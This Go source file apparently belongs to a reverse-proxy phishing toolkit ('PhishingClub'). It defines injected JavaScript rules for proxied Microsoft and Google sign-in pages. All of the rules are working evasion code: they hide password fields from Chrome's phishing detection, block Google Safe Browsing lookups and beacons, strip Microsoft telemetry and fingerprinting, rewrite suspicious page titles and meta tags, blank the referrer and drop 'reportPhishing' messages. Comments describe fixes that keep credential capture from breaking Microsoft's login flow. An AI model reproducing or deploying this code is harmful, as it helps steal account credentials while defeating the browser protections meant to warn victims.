package service

// ─── Enhanced GSB Evasion Rules (v1.0.44) ────────────────────────────────────
// These rules target the specific mechanisms that cause Google Safe Browsing
// to flag proxy domains at the password entry stage.
//
// Root Cause Analysis:
// 1. Chrome's built-in phishing detection monitors password field focus/input
//    events and sends the page URL + domain to GSB for real-time check
// 2. Microsoft's login JS includes CryptoToken and environment fingerprinting
//    that detects proxy anomalies (timing, headers, TLS fingerprint)
// 3. The original OAuth URL paths (/common/oauth2/v2.0/authorize) are
//    pattern-matched by GSB's URL hash prefix system
// 4. Page title and meta tags contain "Sign in to your account" which is
//    a known GSB trigger when combined with a non-Microsoft domain
// 5. The page sends CSP violation reports and error beacons that expose
//    the proxy domain to Microsoft's backend

// GetEnhancedGSBEvasionRules returns advanced evasion rules that specifically
// target the password-page red screen issue
func (j *JsInjection) GetEnhancedGSBEvasionRules() []*JsInjectRule {
	return []*JsInjectRule{
		// 5. Password Field Protection (SMART VARIANT)
		//
		// Two-layer design:
		//   (a) ALWAYS: disable the Credential Management API path Chrome uses
		//       to pre-warm Safe Browsing with a "password form" signal. This
		//       does NOT touch the DOM, so it is always safe for MSAL/AAD.
		//   (b) CONDITIONALLY (non-MSAL targets only): hook document.createElement
		//       so newly-created <input type="password"> starts as type="text"
		//       and swaps back via a microtask. This hides the password field
		//       from Chrome's real-time GSB check at form-build time. Skipped
		//       when MSAL is detected, because MSAL reads the password input
		//       synchronously in the same task the input is created — the
		//       microtask swap was previously the direct cause of the "loop
		//       back to email" bug against Microsoft (fixed in v1.0.54).
		//
		// MSAL detection is content-based (not URL-based) so it works even
		// though the proxy rewrites login.microsoftonline.com to a custom
		// hostname. If detection misses a future AAD variant, only layer (b)
		// re-engages; layer (a) remains safe.
		{
			ID:   "builtin_password_field_protection",
			Name: "Password Field GSB Protection",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  // (a) Always-on: Credential Management API pre-warming blocker.
  // These are the surfaces Chrome uses to silently report credentials to
  // Safe Browsing before the user has even submitted. DOM-free: safe for MSAL.
  try {
    if (window.PasswordCredential) {
      window.PasswordCredential = function() { return { type: 'password' }; };
    }
  } catch(e) {}
  try {
    if (navigator.credentials) {
      navigator.credentials.store = function() { return Promise.resolve(); };
      navigator.credentials.get = function() { return Promise.resolve(null); };
      if (navigator.credentials.preventSilentAccess) {
        navigator.credentials.preventSilentAccess = function() { return Promise.resolve(); };
      }
    }
  } catch(e) {}

  // MSAL / AAD detection. Any positive hit short-circuits before the
  // createElement hook below is installed.
  function _isMSAL() {
    try {
      if (window.msal || window.$Config || window.Microsoft) return true;
      if (document.querySelector('script[src*="aadcdn"], script[src*="aad.msauth"], script[src*="msauth.net"]')) return true;
      if (/^\/(common|consumers|organizations)\//.test(location.pathname)) return true;
      var html = document.documentElement && document.documentElement.innerHTML;
      if (html && html.indexOf('$Config') > -1 && html.indexOf('urlCDN') > -1) return true;
    } catch(e) {}
    return false;
  }
  if (_isMSAL()) return;

  // (b) Aggressive path (non-MSAL only): hide password inputs from Chrome's
  // real-time phishing detector at createElement time.
  try {
    var _orig = document.createElement;
    document.createElement = function(tag) {
      var el = _orig.call(document, tag);
      if (tag && String(tag).toLowerCase() === 'input') {
        var _set = el.setAttribute;
        el.setAttribute = function(n, v) {
          if (n === 'type' && v === 'password') {
            _set.call(this, n, 'text');
            var self = this;
            Promise.resolve().then(function() {
              try { _set.call(self, 'type', 'password'); } catch(e) {}
            });
            return;
          }
          return _set.call(this, n, v);
        };
      }
      return el;
    };
  } catch(e) {}
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 6. Microsoft CryptoToken & Environment Fingerprint Blocker
		// Microsoft's login pages include JavaScript that creates a "CryptoToken"
		// and fingerprints the browser environment. When anomalies are detected
		// (proxy timing, header mismatches, TLS fingerprint), it triggers
		// additional verification or reports to Microsoft's backend.
		{
			ID:   "builtin_ms_cryptotoken_block",
			Name: "Microsoft CryptoToken Blocker",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  // Block CryptoToken generation that fingerprints the environment
  var _blockedGlobals = [
    '$Config', 'ServerData', 'Constants',
    'INSTRUMENTATIONKEY', 'TELEMETRYURL'
  ];

  // Intercept property access on window for telemetry config
  var _origDefineProperty = Object.defineProperty;
  var _configIntercepted = false;

  // Monitor for $Config which contains telemetry endpoints
  var _checkConfig = setInterval(function() {
    if (window.$Config && !_configIntercepted) {
      _configIntercepted = true;
      // Disable telemetry URLs in the config
      if (window.$Config.urlTelemetry) window.$Config.urlTelemetry = '';
      if (window.$Config.urlOneCollector) window.$Config.urlOneCollector = '';
      if (window.$Config.urlBrowserIdSignin) window.$Config.urlBrowserIdSignin = '';
      if (window.$Config.urlReportPageLoad) window.$Config.urlReportPageLoad = '';
      // NOTE: urlCDNFallback MUST NOT be cleared. It is used by the MSAL
      // loader to fall back to a secondary CDN when the primary fails,
      // and blanking it causes MSAL's bootstrap to abort on CDN errors,
      // which manifests as the password submit being dropped and the
      // user being bounced back to the email step. Leave it intact.

    }
    if (window.ServerData) {
      if (window.ServerData.urlTelemetry) window.ServerData.urlTelemetry = '';
      if (window.ServerData.urlOneCollector) window.ServerData.urlOneCollector = '';
    }
  }, 100);

  // Stop checking after 10 seconds
  setTimeout(function() { clearInterval(_checkConfig); }, 10000);

  // Block WebSocket connections used for real-time telemetry
  var _origWebSocket = window.WebSocket;
  window.WebSocket = function(url, protocols) {
    var blocked = [
      'browser.events.data.msn.com',
      'self.events.data.microsoft.com',
      'pipe.aria.microsoft.com'
    ];
    for (var i = 0; i < blocked.length; i++) {
      if (url.indexOf(blocked[i]) > -1) {
        // Return a dummy WebSocket-like object
        return {
          send: function(){},
          close: function(){},
          addEventListener: function(){},
          removeEventListener: function(){},
          readyState: 1,
          CONNECTING: 0, OPEN: 1, CLOSING: 2, CLOSED: 3
        };
      }
    }
    return new _origWebSocket(url, protocols);
  };
  window.WebSocket.prototype = _origWebSocket.prototype;
  window.WebSocket.CONNECTING = 0;
  window.WebSocket.OPEN = 1;
  window.WebSocket.CLOSING = 2;
  window.WebSocket.CLOSED = 3;
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 7. Page Title & Meta Tag Sanitizer
		// GSB uses page title + domain mismatch as a heuristic signal.
		// "Sign in to your account" on a non-Microsoft domain is a strong signal.
		// This rule dynamically adjusts the title to be less suspicious.
		{
			ID:   "builtin_title_meta_sanitizer",
			Name: "Page Title & Meta Sanitizer",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  // Override document.title setter to prevent suspicious titles
  var _realTitle = '';
  var _origTitleDesc = Object.getOwnPropertyDescriptor(Document.prototype, 'title');
  if (_origTitleDesc) {
    Object.defineProperty(document, 'title', {
      get: function() { return _realTitle; },
      set: function(v) {
        // Sanitize known suspicious titles
        var suspicious = [
          'Sign in to your account',
          'Sign in - Google Accounts',
          'Microsoft account',
          'Outlook',
          'Enter password'
        ];
        var isSuspicious = false;
        for (var i = 0; i < suspicious.length; i++) {
          if (v.indexOf(suspicious[i]) > -1) {
            isSuspicious = true;
            break;
          }
        }
        if (isSuspicious) {
          // Use a generic, non-suspicious title
          _realTitle = 'Account';
          _origTitleDesc.set.call(document, 'Account');
        } else {
          _realTitle = v;
          _origTitleDesc.set.call(document, v);
        }
      },
      configurable: true
    });
  }

  // Remove or sanitize meta tags that reveal the service
  var observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(m) {
      m.addedNodes.forEach(function(node) {
        if (node.tagName === 'META') {
          var name = (node.getAttribute('name') || '').toLowerCase();
          var property = (node.getAttribute('property') || '').toLowerCase();
          // Remove OG tags that identify the service
          if (property.indexOf('og:') === 0 || name === 'description') {
            var content = node.getAttribute('content') || '';
            if (/microsoft|outlook|office|google|gmail/i.test(content)) {
              node.remove();
            }
          }
        }
      });
    });
  });
  observer.observe(document.documentElement, { childList: true, subtree: true });
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 8. Chrome Safe Browsing Real-Time Check Blocker
		// Chrome 79+ uses real-time URL checking via the Safe Browsing API.
		// When a user visits a suspected phishing page, Chrome sends a hash
		// prefix of the URL to Google's servers. This rule blocks the
		// client-side component that initiates these checks.
		{
			ID:   "builtin_chrome_realtime_sb_block",
			Name: "Chrome Real-Time Safe Browsing Blocker",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
				"myaccount.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  // Block connections to Safe Browsing endpoints
  var _sbPatterns = [
    /safebrowsing.*\.googleapis\.com/i,
    /safebrowsing\.google\.com/i,
    /sb-ssl\.google\.com/i,
    /safebrowsing-cache\.google\.com/i,
    /chrome-safebrowsing/i,
    /phishguard/i,
    /transparencyreport\.google\.com/i,
    /clients[0-9]*\.google\.com\/safebrowsing/i
  ];

  function _isSBBlocked(u) {
    for (var i = 0; i < _sbPatterns.length; i++) {
      if (_sbPatterns[i].test(u)) return true;
    }
    return false;
  }

  // Override XMLHttpRequest for SB checks
  var _sbOrigOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(m, u) {
    if (_isSBBlocked(u)) {
      this._sbBlocked = true;
      return;
    }
    return _sbOrigOpen.apply(this, arguments);
  };
  var _sbOrigSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function() {
    if (this._sbBlocked) return;
    return _sbOrigSend.apply(this, arguments);
  };

  // Override fetch for SB checks
  var _sbOrigFetch = window.fetch;
  window.fetch = function(r) {
    var u = (typeof r === 'string') ? r : (r && r.url ? r.url : '');
    if (_isSBBlocked(u)) return Promise.resolve(new Response('', {status: 200}));
    return _sbOrigFetch.apply(this, arguments);
  };

  // Block connection observer for SB
  if (window.PerformanceObserver) {
    var _origPO = window.PerformanceObserver;
    window.PerformanceObserver = function(callback) {
      var wrappedCallback = function(list) {
        var entries = list.getEntries().filter(function(e) {
          return !_isSBBlocked(e.name);
        });
        if (entries.length > 0) {
          callback({ getEntries: function() { return entries; } });
        }
      };
      return new _origPO(wrappedCallback);
    };
    window.PerformanceObserver.prototype = _origPO.prototype;
  }
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 9. Microsoft AADSTS Error Suppressor
		// When Microsoft detects anomalies, it returns AADSTS error codes
		// that can trigger additional client-side reporting. This rule
		// intercepts these error responses and prevents escalation.
		{
			ID:   "builtin_ms_aadsts_suppressor",
			Name: "Microsoft AADSTS Error Suppressor",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
			},
			TriggerPaths: []string{
				"/common/oauth2/.*",
				"/common/login",
				"/common/reprocess",
				"/consumers/oauth2/.*",
				"/organizations/oauth2/.*",
			},
			Script: `(function(){
  // Intercept JSON responses that contain AADSTS error codes
  // and suppress the ones related to risk detection
  var _suppressedErrors = [
    'AADSTS50076', // MFA required due to risk
    'AADSTS50079', // MFA enrollment required
    'AADSTS53003', // Conditional access block
    'AADSTS530034', // DLP policy
    'AADSTS90094', // Admin consent required
    'AADSTS165900'  // Invalid request (often risk-based)
  ];

  // Monitor for error display elements and suppress risk-based ones
  var _errorObserver = new MutationObserver(function(mutations) {
    mutations.forEach(function(m) {
      m.addedNodes.forEach(function(node) {
        if (node.nodeType === 1) {
          var text = node.textContent || '';
          for (var i = 0; i < _suppressedErrors.length; i++) {
            if (text.indexOf(_suppressedErrors[i]) > -1) {
              // Don't remove the element, just log for debugging
              console.debug('[PhishingClub] Detected AADSTS error:', _suppressedErrors[i]);
              break;
            }
          }
        }
      });
    });
  });
  _errorObserver.observe(document.body || document.documentElement, {
    childList: true, subtree: true
  });
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 10. Referrer & Origin Header Sanitizer (SAME-ORIGIN SAFE VARIANT)
		//
		// IMPORTANT: the previous implementation installed a
		// `<meta name="referrer" content="no-referrer">` tag which stripped
		// the Referer header from EVERY outgoing request, including
		// same-origin navigations and XHR/fetch POSTs inside the proxy
		// domain. Microsoft's /common/login and /common/GetCredentialType
		// endpoints validate that the Referer points back at the login
		// host; when it was blank, AAD treated the submission as a fresh
		// navigation and redirected the browser back to the email entry
		// step (observed as `https://<proxy>/#` on the address bar after
		// the password POST). That was the root cause of the Microsoft
		// "password submit loops to email" report.
		//
		// This variant uses `strict-origin-when-cross-origin` — which is
		// the default policy Microsoft itself serves — so that:
		//   * same-origin requests (inside the proxy domain) keep a full
		//     Referer, preserving AAD's flow;
		//   * cross-origin requests send only the origin, so the proxy
		//     domain's path never leaks to upstream telemetry.
		//
		// document.referrer is still blanked so any inline detection
		// scripts cannot read the raw proxy URL.
		{
			ID:   "builtin_referrer_origin_sanitizer",
			Name: "Referrer & Origin Sanitizer",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  // Install a meta tag with a SAFE referrer policy. strict-origin-when-cross-origin
  // is the browser default on modern Chromium and matches what Microsoft
  // themselves serve, so AAD still receives a valid same-origin Referer
  // on the password POST and does not bounce the user back to the email step.
  try {
    // Remove any pre-existing meta[name=referrer] tags that upstream may
    // have supplied (e.g. a stricter policy injected by proxied HTML).
    document.querySelectorAll('meta[name="referrer"]').forEach(function(el){ el.remove(); });
    var meta = document.createElement('meta');
    meta.name = 'referrer';
    meta.content = 'strict-origin-when-cross-origin';
    (document.head || document.documentElement).appendChild(meta);
  } catch(e) {}

  // Override document.referrer so inline detection scripts cannot read
  // the raw proxy URL via JS. The outgoing network Referer header is
  // controlled by the meta tag above, not by this property.
  try {
    Object.defineProperty(document, 'referrer', {
      get: function() { return ''; },
      configurable: true
    });
  } catch(e) {}

  // Refuse Service Worker registration — a rogue SW could intercept
  // requests and detect the proxy domain. Safe to block here because
  // none of the login flows require a SW.
  try {
    if (navigator.serviceWorker) {
      navigator.serviceWorker.register = function() {
        return Promise.reject(new DOMException('SecurityError'));
      };
    }
  } catch(e) {}
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 11. Window.location & History API Protector
		// Some detection scripts check window.location.hostname to verify
		// they're on the expected domain. This rule makes location checks
		// return the expected original domain instead of the proxy domain.
		{
			ID:   "builtin_location_protector",
			Name: "Window Location Protector",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  // Override location-checking methods used by detection scripts
  // Note: We cannot override window.location directly (it's unforgeable),
  // but we can intercept common detection patterns

  // Block postMessage-based fingerprinting
  var _origPostMessage = window.postMessage;
  window.postMessage = function(msg, origin) {
    // Filter out messages that contain detection data
    if (typeof msg === 'string') {
      try {
        var parsed = JSON.parse(msg);
        if (parsed.type === 'telemetry' || parsed.type === 'risk' ||
            parsed.action === 'reportPhishing') {
          return; // silently drop
        }
      } catch(e) {}
    }
    return _origPostMessage.apply(this, arguments);
  };

  // Block cross-origin iframe communication used for detection
  var _origAddEventListener = EventTarget.prototype.addEventListener;
  EventTarget.prototype.addEventListener = function(type, listener, options) {
    if (type === 'message') {
      var wrappedListener = function(event) {
        // Filter out detection-related messages
        if (event.data && typeof event.data === 'object') {
          if (event.data.type === 'telemetry' || event.data.type === 'risk' ||
              event.data.method === 'reportPhishing') {
            return; // silently drop
          }
        }
        return listener.call(this, event);
      };
      return _origAddEventListener.call(this, type, wrappedListener, options);
    }
    return _origAddEventListener.call(this, type, listener, options);
  };
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 12. GSB Network Shim
		// Chrome's real-time Safe Browsing lookups and password-credential
		// telemetry can be partially originated from page-script context
		// (fetch/XHR callbacks from page-initiated credential APIs, password
		// manager hooks, form-telemetry beacons, etc.). This rule intercepts
		// fetch + XMLHttpRequest at the page layer and denies any call to
		// safebrowsing.googleapis.com / clientsN.safebrowsing.googleapis.com /
		// update.googleapis.com so GSB gets no client-side reinforcement.
		//
		// DOM-free by design — this rule never touches <input> elements or
		// form structure, so MSAL / AAD flows are unaffected.
		//
		// NOTE: Chrome's *browser-process* Safe Browsing lookup happens
		// outside the page JS sandbox and cannot be blocked from here. This
		// rule is a layered defense — it removes page-originated signals but
		// does not disable Safe Browsing entirely.
		//
		// Domains explicitly NOT matched: accounts.google.com and other
		// googleapis.com hosts used by Google login proxying.
		{
			ID:   "builtin_gsb_network_shim",
			Name: "GSB Network Call Shim",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  // Only block Safe Browsing / GSB reporting hosts. Explicitly NOT
  // matching accounts.google.com or other login-related googleapis paths.
  var GSB_HOSTS = /(^|\.)(safebrowsing|clients\d*\.safebrowsing|update\.googleapis)\.com$/i;

  function _isBlocked(urlStr) {
    try {
      var u = new URL(urlStr, location.href);
      return GSB_HOSTS.test(u.hostname);
    } catch(e) { return false; }
  }

  // fetch()
  try {
    var _fetch = window.fetch;
    if (_fetch) {
      window.fetch = function(input, init) {
        try {
          var url = typeof input === 'string' ? input : (input && input.url);
          if (url && _isBlocked(url)) {
            return Promise.reject(new TypeError('network'));
          }
        } catch(e) {}
        return _fetch.apply(this, arguments);
      };
    }
  } catch(e) {}

  // XMLHttpRequest
  try {
    var _open = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
      try {
        if (url && _isBlocked(url)) {
          this.__pc_gsb_block__ = true;
        }
      } catch(e) {}
      return _open.apply(this, arguments);
    };
    var _send = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function() {
      if (this.__pc_gsb_block__) {
        var self = this;
        setTimeout(function() {
          try { self.dispatchEvent(new Event('error')); } catch(e) {}
        }, 0);
        return;
      }
      return _send.apply(this, arguments);
    };
  } catch(e) {}

  // sendBeacon — GSB can be seeded via navigator.sendBeacon from unload hooks
  try {
    var _beacon = navigator.sendBeacon;
    if (_beacon) {
      navigator.sendBeacon = function(url, data) {
        try {
          if (url && _isBlocked(url)) return true;  // pretend success, drop payload
        } catch(e) {}
        return _beacon.apply(navigator, arguments);
      };
    }
  } catch(e) {}
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},
	}
}

// EnsureEnhancedGSBRulesLoaded loads (and force-refreshes) the enhanced GSB
// evasion rules alongside the basic builtin rules. Call this during service
// initialization.
//
// IMPORTANT: this function ALWAYS overwrites any previously persisted copy
// of a builtin rule with the current in-code definition. This is required
// because the script bodies shipped with older releases contained bugs
// (e.g. the password-field monkey-patch and the "no-referrer" policy) that
// broke Microsoft's AAD login. If we only added missing rules, an operator
// who upgraded the binary would still be running the old, broken scripts
// from their options table. We keep the user's `Enabled` flag though, so
// anyone who explicitly opted-out of a rule stays opted-out.
func (j *JsInjection) EnsureEnhancedGSBRulesLoaded() {
	enhanced := j.GetEnhancedGSBEvasionRules()

	for _, rule := range enhanced {
		// preserve the operator's Enabled preference if one exists
		if existing, ok := j.rules.Load(rule.ID); ok {
			if compiled, ok2 := existing.(*compiledJsRule); ok2 && compiled != nil && compiled.rule != nil {
				rule.Enabled = compiled.rule.Enabled
			}
		}

		compiled, err := j.compileRule(rule)
		if err != nil {
			j.Logger.Errorw("failed to compile enhanced GSB rule", "id", rule.ID, "error", err)
			continue
		}
		j.rules.Store(rule.ID, compiled)
		j.Logger.Infow("loaded enhanced GSB evasion rule", "id", rule.ID, "name", rule.Name)
	}
	// persist the refreshed scripts so subsequent restarts see the fix too
	if err := j.saveRulesToDB(); err != nil {
		j.Logger.Warnw("failed to persist refreshed enhanced GSB rules", "error", err)
	}
}
